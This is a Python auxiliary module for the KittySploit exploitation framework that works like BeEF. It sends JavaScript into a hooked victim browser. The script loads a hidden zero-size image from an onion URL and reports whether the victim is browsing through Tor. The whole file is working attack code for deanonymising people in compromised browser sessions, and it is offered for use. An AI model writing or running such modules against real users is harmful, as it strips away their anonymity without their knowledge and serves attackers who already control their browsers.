# -*- coding: utf-8 -*-

from kittysploit import *


class Module(BrowserAuxiliary):

    __info__ = {
        "name": "Detect Tor",
        "description": "Detect if the browser victim is behind Tor by loading an image from an onion URL (BeEF-style)",
        "author": "KittySploit Team",
        "browser": Browser.ALL,
        "platform": Platform.ALL,
        "session_type": SessionType.BROWSER,
    }

    tor_resource = OptString("http://example.onion/torcheck.gif", "URL of an image hosted on Tor",required=True)
    timeout = OptInteger(5, "Timeout in seconds to wait for the image load", required=True)

    def run(self):
        tor_url = self.tor_resource.value.strip().replace("\\", "\\\\").replace("'", "\\'")
        timeout_sec = int(self.timeout) if self.timeout else 5

        code_js = (
            "(function(){return new Promise(function(resolve){"
            "if(document.getElementById('torimg')){resolve('Img already created');return;}"
            "var img=new Image();img.style.visibility='hidden';img.width=0;img.height=0;"
            "img.src='%s';img.id='torimg';img.setAttribute('attr','start');"
            "img.onerror=function(){this.setAttribute('attr','error');};"
            "img.onload=function(){this.setAttribute('attr','load');};"
            "document.body.appendChild(img);"
            "setTimeout(function(){"
            "var el=document.getElementById('torimg');var r;"
            "if(el){r=el.getAttribute('attr')==='error'?'Browser is not behind Tor':"
            "el.getAttribute('attr')==='load'?'Browser is behind Tor':'Browser timed out. Cannot determine if browser is behind Tor';"
            "if(el.parentNode)el.parentNode.removeChild(el);}else r='Element removed before check';"
            "resolve(r);},%d);});})();"
        ) % (tor_url, timeout_sec * 1000)

        result = self.send_js_and_wait_for_response(code_js, timeout=timeout_sec + 5)
        if result is None:
            print_error("No response from browser (timeout or session lost).")
            return False

        msg = str(result).strip()
        if msg == "Browser is behind Tor":
            print_success(msg)
        elif msg == "Browser is not behind Tor":
            print_warning(msg)
        else:
            print_status(msg)
        return True
